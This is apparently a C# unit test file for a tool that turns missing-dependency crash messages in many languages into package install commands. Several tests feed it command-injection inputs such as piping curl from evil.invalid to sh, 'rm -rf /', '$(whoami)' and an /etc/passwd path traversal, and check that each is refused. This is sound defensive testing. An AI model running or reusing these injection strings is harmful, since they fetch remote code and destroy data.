using FixFinder.Core.Execution;
using FixFinder.Core.Parsing;
using FixFinder.Core.Sources;

namespace FixFinder.Tests;

/// <summary>Reading a missing dependency out of a crash in every ecosystem except Python's, and refusing to build a command out
/// of anything that is not one.</summary>
public class MissingDependencyTests
{
    private static ParsedError Error(
        string language, string message, string? type = null, ParsedError[]? causes = null,
        string? raw = null) => new()
    {
        LanguageId = language,
        Confidence = 90,
        RawText = raw ?? (type is null ? message : $"{type}: {message}"),
        FirstLineSequence = 0,
        ExceptionType = type,
        Message = message,
        Frames = [],
        Causes = causes ?? [],
    };

    private static TargetSpec Spec(string? workingDirectory = null) => new()
    {
        ExecutablePath = @"C:\tools\node.exe",
        Arguments = "app.js",
        WorkingDirectory = workingDirectory ?? @"C:\work\nowhere-in-particular",
    };

    private static string? Text(ParsedError error, string? workingDirectory = null) =>
        MissingDependency.For(error, Spec(workingDirectory))?.Command;

    [Theory]
    [InlineData("Cannot find module 'express'", "npm install express")]
    [InlineData("Cannot find package 'chalk' imported from C:\\app\\index.mjs", "npm install chalk")]
    [InlineData("Cannot find module '@babel/core'", "npm install @babel/core")]
    public void NodeNamesThePackageToInstall(string message, string expected) =>
        Assert.Equal(expected, Text(Error("node", message, "Error")));

    [Theory]
    [InlineData("Cannot find module 'lodash/fp'", "npm install lodash")]
    [InlineData("Cannot find module '@babel/core/lib/parser'", "npm install @babel/core")]
    public void ASubpathImportInstallsThePackageThatContainsIt(string message, string expected) =>
        Assert.Equal(expected, Text(Error("node", message, "Error")));

    [Theory]
    [InlineData("Cannot find module './utils'")]
    [InlineData("Cannot find module '../lib/db'")]
    [InlineData("Cannot find module '/opt/app/thing'")]
    [InlineData("Cannot find module 'C:\\app\\thing'")]
    public void ARelativeImportIsNotAPackage(string message) =>
        Assert.Null(Text(Error("node", message, "Error")));

    [Theory]
    [InlineData("Cannot find module 'fs'")]
    [InlineData("Cannot find module 'path'")]
    [InlineData("Cannot find module 'node:crypto'")]
    public void ABuiltInModuleIsNotOfferedForInstall(string message) =>
        Assert.Null(Text(Error("node", message, "Error")));

    [Theory]
    [InlineData("pnpm-lock.yaml", "pnpm add express")]
    [InlineData("yarn.lock", "yarn add express")]
    [InlineData("bun.lockb", "bun add express")]
    [InlineData("package-lock.json", "npm install express")]
    public void TheInstallMatchesTheLockfileInTheProject(string lockfile, string expected)
    {
        using var temp = new TempFolder();
        File.WriteAllText(Path.Combine(temp.Path, lockfile), "");

        Assert.Equal(expected, Text(Error("node", "Cannot find module 'express'", "Error"), temp.Path));
    }

    [Fact]
    public void RubyNamesTheGem() =>
        Assert.Equal(
            "gem install nokogiri",
            Text(Error("ruby", "cannot load such file -- nokogiri", "LoadError")));

    [Theory]
    [InlineData("cannot load such file -- active_support", "gem install activesupport")]
    [InlineData("cannot load such file -- active_record/base", "gem install activerecord")]
    public void ARequirePathThatDiffersFromTheGemIsTranslated(string message, string expected) =>
        Assert.Equal(expected, Text(Error("ruby", message, "LoadError")));

    [Fact]
    public void ABundledProjectGetsTheBundlerCommand()
    {
        using var temp = new TempFolder();
        File.WriteAllText(Path.Combine(temp.Path, "Gemfile"), "source 'https://rubygems.org'\n");

        Assert.Equal(
            "bundle add nokogiri",
            Text(Error("ruby", "cannot load such file -- nokogiri", "LoadError"), temp.Path));
    }

    [Fact]
    public void ARelativeRequireIsNotAGem() =>
        Assert.Null(Text(Error("ruby", "cannot load such file -- ./helpers", "LoadError")));

    [Theory]
    [InlineData(
        "no required module provides package github.com/gorilla/mux; to add it:",
        "go get github.com/gorilla/mux")]
    [InlineData(
        "cannot find module providing package gopkg.in/yaml.v3",
        "go get gopkg.in/yaml.v3")]
    public void GoNamesTheModuleToGet(string message, string expected) =>
        Assert.Equal(expected, Text(Error("go", message)));

    [Theory]
    [InlineData("no required module provides package ../../../etc/passwd")]
    [InlineData("no required module provides package github.com/../../evil")]
    [InlineData("no required module provides package -insecure")]
    [InlineData("no required module provides package notahost")]
    public void AGoPathThatIsNotAModulePathIsRefused(string message) =>
        Assert.Null(Text(Error("go", message)));

    [Theory]
    [InlineData("can't find crate for `serde`", "cargo add serde")]
    [InlineData("use of undeclared crate or module `rand`", "cargo add rand")]
    [InlineData("unresolved import `tokio`", "cargo add tokio")]
    public void RustNamesTheCrateToAdd(string message, string expected) =>
        Assert.Equal(expected, Text(Error("rust", message)));

    [Theory]
    [InlineData("unresolved import `crate`")]
    [InlineData("unresolved import `self`")]
    [InlineData("unresolved import `super`")]
    [InlineData("can't find crate for `std`")]
    public void APathKeywordIsNotACrate(string message) =>
        Assert.Null(Text(Error("rust", message)));

    [Fact]
    public void DotNetTakesTheAssemblyNameWithoutItsVersion() =>
        Assert.Equal(
            "dotnet add package Newtonsoft.Json",
            Text(Error(
                "csharp",
                "Could not load file or assembly 'Newtonsoft.Json, Version=13.0.0.0, Culture=neutral, " +
                "PublicKeyToken=30ad4fe6b2a6aeed'. The system cannot find the file specified.",
                "System.IO.FileNotFoundException")));

    [Fact]
    public void JavaGivesThePomBlockForAKnownArtifact()
    {
        var fix = MissingDependency.For(
            Error("java", "org.apache.commons.lang3.StringUtils", "java.lang.ClassNotFoundException"),
            Spec());

        Assert.NotNull(fix);
        Assert.Contains("<groupId>org.apache.commons</groupId>", fix!.Command!, StringComparison.Ordinal);
        Assert.Contains("<artifactId>commons-lang3</artifactId>", fix.Command!, StringComparison.Ordinal);
        Assert.Contains("pom.xml", fix.CommandDescription, StringComparison.Ordinal);
    }

    [Fact]
    public void TheInternalClassFormIsUnderstood()
    {
        var fix = MissingDependency.For(
            Error("java", "com/google/gson/Gson", "java.lang.NoClassDefFoundError"), Spec());

        Assert.NotNull(fix);
        Assert.Contains("com.google.code.gson", fix!.Command!, StringComparison.Ordinal);
    }

    [Fact]
    public void AGradleProjectGetsTheGradleLine()
    {
        using var temp = new TempFolder();
        File.WriteAllText(Path.Combine(temp.Path, "build.gradle"), "plugins { id 'java' }\n");

        var fix = MissingDependency.For(
            Error("java", "org.slf4j.LoggerFactory", "java.lang.ClassNotFoundException"),
            Spec(temp.Path));

        Assert.NotNull(fix);
        Assert.Equal("implementation(\"org.slf4j:slf4j-api:VERSION\")", fix!.Command);
        Assert.Contains("build.gradle", fix.CommandDescription, StringComparison.Ordinal);
    }

    [Fact]
    public void AnUnknownJavaClassIsLeftToTheSearch() =>
        Assert.Null(Text(Error(
            "java", "com.acme.internal.Widget", "java.lang.ClassNotFoundException")));

    [Fact]
    public void ADependencyIsFoundInsideACauseChain()
    {
        var error = Error("java", "Could not initialise the mapper", "java.lang.ExceptionInInitializerError", causes:
        [
            Error("java", "com.fasterxml.jackson.databind.ObjectMapper", "java.lang.ClassNotFoundException"),
        ]);

        Assert.Contains("jackson-databind", Text(error)!, StringComparison.Ordinal);
    }

    [Theory]
    [InlineData("java", "com.google.gson.Gson", "java.lang.ClassNotFoundException",
        "Exception in thread \"main\" java.lang.ClassNotFoundException: com.google.gson.Gson\r\n\tat App.main(App.java:3)",
        "<artifactId>gson</artifactId>")]
    [InlineData("ruby", "", "LoadError",
        "app.rb:1:in 'require': cannot load such file -- nokogiri (LoadError)\r\n\tfrom app.rb:1:in '<main>'",
        "gem install nokogiri")]
    public void AWindowsLineEndingDoesNotHideTheName(
        string language, string message, string type, string raw, string expected) =>
        Assert.Contains(expected, Text(Error(language, message, type, raw: raw)) ?? "(nothing)", StringComparison.Ordinal);

    [Theory]
    [InlineData("java", "java.lang.ClassNotFoundException",
        "java.lang.ClassNotFoundException: org.apache.commons.lang3.StringUtils && curl evil.invalid\r\n\tat App.main(App.java:3)")]
    [InlineData("ruby", "LoadError",
        "app.rb:1:in 'require': cannot load such file -- nokogiri && curl evil.invalid (LoadError)\r\n\tfrom app.rb:1:in '<main>'")]
    public void AWindowsLineEndingDoesNotLetTrailingTextThrough(string language, string type, string raw) =>
        Assert.Null(Text(Error(language, "", type, raw: raw)));

    [Fact]
    public void ARealClassNotFoundExceptionGetsThePomBlock()
    {
        var error = new ParserRegistry().Parse(Fixtures.LoadStackTrace("java/live-classnotfound.txt"));

        Assert.NotNull(error);
        Assert.Equal("java", error!.LanguageId);

        var fix = MissingDependency.For(error, Spec());

        Assert.NotNull(fix);
        Assert.Contains("<groupId>com.google.code.gson</groupId>", fix!.Command!, StringComparison.Ordinal);
        Assert.Contains("<artifactId>gson</artifactId>", fix.Command!, StringComparison.Ordinal);
    }

    [Theory]
    [InlineData("Can't locate LWP/UserAgent.pm in @INC (you may need to install the LWP::UserAgent module)",
        "cpanm LWP::UserAgent")]
    [InlineData("Can't locate JSON.pm in @INC (@INC contains: /usr/lib/perl5)", "cpanm JSON")]
    public void PerlNamesTheModuleToInstall(string message, string expected) =>
        Assert.Equal(expected, Text(Error("perl", message)));

    [Theory]
    [InlineData("Class \"GuzzleHttp\\Client\" not found", "composer require guzzlehttp/guzzle")]
    [InlineData("Class \"Symfony\\Component\\Console\\Application\" not found", "composer require symfony/console")]
    [InlineData("Class \"Monolog\\Logger\" not found", "composer require monolog/monolog")]
    public void PhpNamesTheComposerPackage(string message, string expected) =>
        Assert.Equal(expected, Text(Error("php", message, "Error")));

    [Fact]
    public void AnUnknownPhpNamespaceIsLeftToTheSearch() =>
        Assert.Null(Text(Error("php", "Class \"Acme\\Internal\\Widget\" not found", "Error")));

    [Fact]
    public void DartNamesThePackageToAdd() =>
        Assert.Equal(
            "dart pub add http",
            Text(Error("dart", "Couldn't resolve the package 'http' in 'package:http/http.dart'")));

    [Theory]
    [InlineData("module 'socket' not found", "luarocks install socket")]
    [InlineData("module 'socket.http' not found", "luarocks install socket")]
    public void LuaNamesTheRockToInstall(string message, string expected) =>
        Assert.Equal(expected, Text(Error("lua", message)));

    [Theory]
    [InlineData("node", "Cannot find module 'express && curl evil.invalid | sh'")]
    [InlineData("node", "Cannot find module '--registry=http://evil.invalid'")]
    [InlineData("node", "Cannot find module 'x; rm -rf /'")]
    [InlineData("node", "Cannot find module '$(whoami)'")]
    [InlineData("ruby", "cannot load such file -- nokogiri;curl evil.invalid")]
    [InlineData("ruby", "cannot load such file -- --version=`id`")]
    [InlineData("go", "no required module provides package github.com/x/y && echo hi")]
    [InlineData("rust", "can't find crate for `serde; echo hi`")]
    [InlineData("csharp", "Could not load file or assembly '--interactive'")]
    [InlineData("java", "org.apache.commons.lang3.StringUtils; echo hi")]
    [InlineData("perl", "Can't locate LWP/UserAgent.pm; curl evil.invalid in @INC")]
    [InlineData("php", "Class \"GuzzleHttp\\Client; curl evil.invalid\" not found")]
    [InlineData("dart", "Couldn't resolve the package 'http && curl evil.invalid'")]
    [InlineData("lua", "module 'socket; curl evil.invalid' not found")]
    public void NothingThatIsNotAPackageNameBecomesACommand(string language, string message)
    {
        var command = Text(Error(language, message, "Error"));

        Assert.True(
            command is null || !command.Contains("evil.invalid", StringComparison.Ordinal),
            $"produced: {command}");

        foreach (var dangerous in new[] { "&&", "||", ";", "|", "$(", "`", "rm -rf" })
            Assert.DoesNotContain(dangerous, command ?? "", StringComparison.Ordinal);
    }

    [Theory]
    [InlineData("go", "no required module provides package github.com/x/y && curl evil.invalid", null)]
    [InlineData("ruby", "cannot load such file -- nokogiri && curl evil.invalid", "LoadError")]
    [InlineData("java", "org.apache.commons.lang3.StringUtils && curl evil.invalid", "java.lang.ClassNotFoundException")]
    public void ANameWithAnythingAfterItIsNotTruncatedIntoAValidOne(
        string language, string message, string? type) =>
        Assert.Null(Text(Error(language, message, type)));

    [Fact]
    public void RubysOwnLoadErrorSuffixIsNotMistakenForJunk() =>
        Assert.Equal(
            "gem install nokogiri",
            Text(Error("ruby", "app.rb:1:in 'require': cannot load such file -- nokogiri (LoadError)")));

    [Fact]
    public void AClassThatFailedToInitialiseIsNotAMissingDependency() =>
        Assert.Null(Text(Error(
            "java", "Could not initialize class com.acme.Thing", "java.lang.NoClassDefFoundError")));

    [Fact]
    public void PythonIsLeftToTheOneThatKnowsWhichInterpreterRanIt() =>
        Assert.Null(Text(Error("python", "No module named 'requests'", "ModuleNotFoundError")));

    [Theory]
    [InlineData("node", "undefined is not a function")]
    [InlineData("go", "index out of range [3] with length 2")]
    [InlineData("rust", "attempt to divide by zero")]
    [InlineData("csharp", "Object reference not set to an instance of an object.")]
    public void AnOrdinaryCrashIsNotADependencyProblem(string language, string message) =>
        Assert.Null(Text(Error(language, message, "Error")));
}
